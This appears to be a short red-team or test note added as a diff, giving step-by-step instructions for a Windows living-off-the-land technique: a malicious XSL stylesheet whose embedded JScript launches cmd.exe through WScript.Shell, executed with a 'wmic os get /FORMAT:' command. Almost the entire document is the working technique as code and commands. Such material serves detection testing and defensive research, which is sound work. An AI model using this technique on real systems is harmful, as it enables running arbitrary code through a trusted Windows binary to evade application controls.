@@ -1,0 +1,19 @@
+1. Create minimalist.xsl file.
+Reference: https://gist.githubusercontent.com/caseysmithrc/68924cabbeca1285d2941298a5b91c24/raw/8574e0c019b17d84028833220ed0b30cf9eea84b/minimalist.xsl
+Reference: https://gist.githubusercontent.com/caseysmithrc/9b53bc3c1201cdce5d2d8663d868ebc6/raw/5e4856e6d5812bdd204ca83558ec7bf061a5b434/gistfile1.txt
+
+<?xml version='1.0'?>
+<stylesheet
+xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
+xmlns:user="placeholder"
+version="1.0">
+<output method="text"/>
+	<ms:script implements-prefix="user" language="JScript">
+	<![CDATA[
+	var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
+	]]> </ms:script>
+</stylesheet>
+
+2. Test minimalist.xsl execution using wmic xsl file.
+
+wmic os get /FORMAT:minimalist.xsl
